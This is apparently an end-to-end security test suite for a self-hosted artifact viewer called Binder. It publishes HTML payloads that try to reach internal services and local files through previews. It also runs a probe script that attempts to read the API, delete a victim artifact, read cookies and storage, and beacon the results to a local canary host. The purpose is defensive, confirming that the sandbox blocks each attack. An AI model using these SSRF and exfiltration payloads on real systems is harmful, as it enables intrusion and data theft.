export {};
// End-to-end checks against a running Binder container, with real Chromium.
// Run by scripts/e2e.sh inside the container: bun /e2e/container.ts
// Synthetic data only.
const BINDER = process.env.BINDER_URL ?? "http://127.0.0.1:8480";
const CHROMIUM = process.env.CHROMIUM ?? "/usr/bin/chromium-browser";
const HAS_CHROMIUM = await Bun.file(CHROMIUM).exists();
const auth: Record<string, string> = process.env.BINDER_TOKEN ? { authorization: `Bearer ${process.env.BINDER_TOKEN}` } : {};
const write = { ...auth, "x-binder": "1" };

let failures = 0;
function check(name: string, ok: boolean, detail = "") {
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${detail && !ok ? `: ${detail}` : ""}`);
  if (!ok) failures++;
}

// A stand-in for an internal http service (cloud metadata, a router page) and a beacon sink.
const canaryHits: string[] = [];
const canary = Bun.serve({
  port: 0, hostname: "127.0.0.1",
  fetch(req) {
    canaryHits.push(new URL(req.url).pathname + new URL(req.url).search);
    return new Response("<h1>INTERNAL SECRET</h1>", { headers: { "content-type": "text/html" } });
  },
});
const C = `http://127.0.0.1:${canary.port}`;
// A raw TCP listener: counts every connection attempt, including TLS handshakes that would fail.
let tcpConnections = 0;
const tcpLog: string[] = [];
const tcp = Bun.listen({ hostname: "0.0.0.0", port: 0, socket: { open(s) { tcpConnections++; tcpLog.push(`${new Date().toISOString().slice(11, 23)} from ${s.remoteAddress}`); s.end(); }, data() {} } });
const { networkInterfaces } = await import("node:os");
const ownIp = Object.values(networkInterfaces()).flat().find((i) => i && i.family === "IPv4" && !i.internal)?.address ?? "127.0.0.1";
const T = (host: string) => `https://${host}:${tcp.port}`;
if (process.env.BINDER_TOKEN) {
  check("the image serves /llms.txt from the bundled skill", (await (await fetch(`${BINDER}/llms.txt`)).text()).includes("/api/artifacts"));
  check("anonymous API request is refused", (await fetch(`${BINDER}/api/artifacts`)).status === 401);
  const who = await (await fetch(`${BINDER}/api/session`, { headers: auth })).json();
  check("the CLI-made token works", who.name === "e2e" && who.scope === "write", JSON.stringify(who));
}

async function publish(meta: object, files: Record<string, string>) {
  const f = new FormData();
  f.set("meta", JSON.stringify(meta));
  for (const [p, body] of Object.entries(files)) f.append("file", new File([body], p, { type: "text/html" }));
  const r = await fetch(`${BINDER}/api/artifacts`, { method: "POST", headers: write, body: f });
  if (!r.ok) throw new Error(`publish ${JSON.stringify(meta)}: ${r.status} ${await r.text()}`);
  return r.json();
}
const getJson = async (path: string) => (await fetch(BINDER + path, { headers: auth })).json();

// 1. Contract: publish, view, version history.
const v1 = await publish({ id: "e2e-doc", title: "E2E doc", project: "e2e", note: "first" }, {
  "index.html": "<h1>one</h1><img src='img/dot.svg'>", "img/dot.svg": "<svg xmlns='http://www.w3.org/2000/svg'/>",
});
check("publish returns version 1", v1.version === 1);
check("content URL serves the entry", (await (await fetch(v1.content_url)).text()).includes("<h1>one</h1>"));
check("relative subresource loads with no credential", (await fetch(new URL("img/dot.svg", v1.content_url))).ok);
const v2 = await publish({ id: "e2e-doc", title: "E2E doc", note: "second" }, { "index.html": "<h1>two</h1>" });
const hist = (await getJson("/api/artifacts/e2e-doc/versions")).versions;
check("history lists both versions, newest first", hist.map((v: { version: number }) => v.version).join() === "2,1");
check("history records the note and diff", hist[0].note === "second" && hist[0].changes.removed.includes("img/dot.svg"));
check("old version still readable", (await (await fetch(hist[1].content_url)).text()).includes("<h1>one</h1>"));
check("viewer shell loads", (await (await fetch(`${BINDER}/a/e2e-doc`)).text()).includes("<title>Binder</title>"));
check("history records the token name", hist[0].published_by === "e2e" && v2.published_by === "e2e");

// 2. Previews cannot capture internal http services or local files. (Needs Chromium; skipped for the slim image.)
if (HAS_CHROMIUM) {
  const attacks: Record<string, string> = {
    nav: `<script>location="${C}/nav"</script>`,
    meta: `<meta http-equiv="refresh" content="0;url=${C}/meta">`,
    frame: `<iframe src="${C}/frame"></iframe>`,
    img: `<img src="${C}/img">`,
    fetch: `<script>fetch("${C}/fetch",{mode:"no-cors"}).catch(()=>{})</script>`,
    top: `<script>try{top.location="${C}/top"}catch(e){}</script>`,
    popup: `<script>window.open("${C}/popup")</script>`,
    datanav: `<script>location="data:text/html,<img src=${C}/data>"</script>`,
    srcdoc: `<iframe srcdoc="<img src=${C}/srcdoc><script>location='${C}/srcdocnav'</script>"></iframe>`,
    form: `<form action="${C}/form"></form><script>document.forms[0].submit()</script>`,
    file: `<iframe src="file:///etc/passwd"></iframe><img src="file:///data/secret.key">`,
    // Private https services (with a real certificate they would render): loopback and the host's own address.
    httpsimg: `<img src="${T("127.0.0.1")}/img"><img src="${T(ownIp)}/img">`,
    httpsframe: `<iframe src="${T(ownIp)}/frame"></iframe>`,
    httpsfetch: `<script>fetch("${T(ownIp)}/fetch",{mode:"no-cors"}).catch(()=>{})</script>`,
    httpscss: `<link rel="stylesheet" href="${T(ownIp)}/a.css"><style>@font-face{font-family:x;src:url(${T("127.0.0.1")}/f.woff)}body{font-family:x}</style>x`,
    httpsnav: `<script>location="${T(ownIp)}/nav"</script>`,
    worker: `<script>try{new Worker(URL.createObjectURL(new Blob(['fetch("${T(ownIp)}/w")'])))}catch(e){}</script>`,
  };
  // A second artifact's normal (view-mode) URL carries no render restrictions. Frame or open it from a preview.
  const helper = await publish({ title: "preview helper", project: "e2e" }, { "index.html": `<iframe src="${C}/via-view-frame"></iframe><img src="${C}/via-view-img"><img src="${T(ownIp)}/via-view">` });
  const helperPath = new URL(helper.content_url).pathname;
  attacks.nestedview = `<iframe src="${helperPath}"></iframe>`;
  attacks.navview = `<script>location="${helperPath}"</script>`;
  attacks.objectview = `<object data="${helperPath}" type="text/html"></object><embed src="${helperPath}" type="text/html">`;
  attacks.topview = `<script>try{top.location="${helperPath}"}catch(e){}</script>`;
  const attackIds: string[] = [];
  for (const [name, html] of Object.entries(attacks)) attackIds.push((await publish({ title: `preview attack ${name}`, project: "e2e" }, { "index.html": html })).id);
  const control = await publish({ title: "preview control", project: "e2e" }, { "index.html": "<h1 style='font-size:120px'>Control</h1>" });
  const deadline = Date.now() + 120_000;
  let thumbed: Record<string, boolean> = {};
  const doneAt: string[] = [];
  while (Date.now() < deadline) {
    const list = (await getJson("/api/artifacts")).artifacts as { id: string; thumb: boolean }[];
    for (const a of list) if (a.thumb && !thumbed[a.id]) doneAt.push(`${new Date().toISOString().slice(11, 23)} ${a.id}`);
    thumbed = Object.fromEntries(list.map((a) => [a.id, a.thumb]));
    if ([control.id, ...attackIds].every((id) => thumbed[id])) break;
    await Bun.sleep(200);
  }
  check("control preview rendered", Boolean(thumbed[control.id]));
  check("every attack preview rendered (so the attacks ran)", attackIds.every((id) => thumbed[id]), JSON.stringify(thumbed));
  check("internal http service got no request from any preview", canaryHits.length === 0, canaryHits.join(", "));
  check("no preview opened a TCP connection to a private https address", tcpConnections === 0, `${tcpConnections} connection(s); ownIp ${ownIp}; ${tcpLog.join(", ")}; previews done: ${doneAt.join(", ")}`);
}

// 3. An artifact in the viewer cannot read or change Binder. It reports what it could do to the canary.
const probe = (binder: string) => `<script>
const beacon = (k, v) => { new Image().src = "${C}/r?" + k + "=" + encodeURIComponent(v); };
const B = "${binder}";
fetch(B + "/api/artifacts", { credentials: "include" }).then(r => r.text()).then(t => beacon("read", "LEAK:" + t.slice(0, 40)), () => beacon("read", "blocked"));
fetch(B + "/api/artifacts/e2e-victim", { method: "DELETE", credentials: "include", headers: { "x-binder": "1" } }).then(() => beacon("delete", "sent"), () => beacon("delete", "blocked"));
fetch(B + "/api/artifacts/e2e-victim", { method: "POST", mode: "no-cors", credentials: "include", body: "x" }).then(() => beacon("simplepost", "sent"), () => beacon("simplepost", "blocked"));
try { beacon("parent", "LEAK:" + parent.document.title); } catch { beacon("parent", "blocked"); }
try { beacon("storage", "LEAK:" + localStorage.length); } catch { beacon("storage", "blocked"); }
try { beacon("cookie", "LEAK:" + document.cookie); } catch { beacon("cookie", "blocked"); }
beacon("origin", String(self.origin));
</script>`;

/** Opens the viewer in Chromium, after an optional sign-in on the Binder page. */
async function viewInBrowser(binder: string, viewerPath: string, signInToken?: string) {
  const { browser } = await import("./cdp");  // shared Chromium; see shutdown() below
  const b = await browser();
  try {
    await b.goto(`${binder}/`);
    if (signInToken) {
      const status = await b.evaluate<number>(
        `fetch("/api/session",{method:"POST",headers:{"x-binder":"1","content-type":"application/json"},body:JSON.stringify({token:${JSON.stringify(signInToken)}})}).then(r=>r.status)`,
      );
      check("browser signs in with a token", status === 200, String(status));
    }
    await b.goto(binder + viewerPath, 4000);
  } finally {
    b.close();
  }
}

async function sandboxProbe(label: string, binder: string, headers: Record<string, string>, signInToken?: string) {
  canaryHits.length = 0;
  const pub = async (meta: object, html: string) => {
    const f = new FormData();
    f.set("meta", JSON.stringify(meta));
    f.append("file", new File([html], "index.html", { type: "text/html" }));
    const r = await fetch(`${binder}/api/artifacts`, { method: "POST", headers: { ...headers, "x-binder": "1" }, body: f });
    if (!r.ok) throw new Error(`${label} publish: ${r.status} ${await r.text()}`);
    return r.json();
  };
  await pub({ id: "e2e-victim", title: "Victim", project: "e2e" }, "<p>victim</p>");
  await pub({ id: "e2e-attacker", title: "Attacker", project: "e2e" }, probe(binder));
  if (!HAS_CHROMIUM) return;
  await viewInBrowser(binder, "/a/e2e-attacker", signInToken);
  const report = Object.fromEntries(canaryHits.filter((h) => h.startsWith("/r?")).map((h) => [...new URLSearchParams(h.slice(3))][0]!));
  check(`[${label}] probe ran in the viewer, in an opaque origin`, report.origin === "null", JSON.stringify(report));
  for (const k of ["read", "parent", "storage", "cookie"]) check(`[${label}] artifact cannot ${k}`, report[k] === "blocked", JSON.stringify(report[k]));
  check(`[${label}] victim survived DELETE and simple POST`, (await fetch(`${binder}/api/artifacts/e2e-victim`, { headers })).ok);
}

await sandboxProbe("token session", BINDER, auth, process.env.BINDER_TOKEN);

// 4. Header mode behind a proxy that injects the identity, like `tailscale serve`.
const hdrPort = 8490;
const hdr = Bun.spawn(["bun", "/app/src/server.ts"], {
  env: { ...process.env, PORT: String(hdrPort), HOST: "127.0.0.1", BINDER_DATA_DIR: "/tmp/e2e-header", BINDER_PREVIEWS: "off",
    BINDER_AUTH_HEADER: "Tailscale-User-Login", BINDER_ALLOWED_USERS: "e2e@example.com" },
  stdout: "ignore", stderr: "inherit",
});
const proxy = Bun.serve({
  port: 0, hostname: "127.0.0.1",
  async fetch(req) {
    const u = new URL(req.url);
    const h = new Headers(req.headers);
    h.set("tailscale-user-login", "e2e@example.com"); // a real proxy overwrites any client-sent value
    return fetch(`http://127.0.0.1:${hdrPort}${u.pathname}${u.search}`, { method: req.method, headers: h, body: req.body, redirect: "manual" });
  },
});
for (let i = 0; i < 50; i++) { if (await fetch(`http://127.0.0.1:${hdrPort}/healthz`).then((r) => r.ok, () => false)) break; await Bun.sleep(100); }
const P = `http://127.0.0.1:${proxy.port}`;
const viaProxy = await fetch(`${P}/api/session`).then((r) => r.json());
check("[header] proxy identity is recorded", viaProxy.name === "e2e@example.com" && viaProxy.via === "header", JSON.stringify(viaProxy));
await sandboxProbe("header", P, {});
const hv = (await (await fetch(`${P}/api/artifacts/e2e-attacker/versions`)).json()).versions;
check("[header] history records the proxy login", hv[0].published_by === "e2e@example.com");
proxy.stop(true);
hdr.kill();

// Previews and browser checks spawn many Chromium processes; PID 1 (tini) must reap them.
const zombies = Number((await Bun.$`ps -eo stat`.text()).split("\n").filter((l) => l.startsWith("Z")).length);
check("no zombie processes pile up", zombies < 5, `${zombies} zombies`);

canary.stop(true);
tcp.stop(true);
if (HAS_CHROMIUM) await (await import("./cdp")).shutdown();
console.log(failures ? `${failures} check(s) failed` : "all e2e checks passed");
process.exit(failures ? 1 : 0);
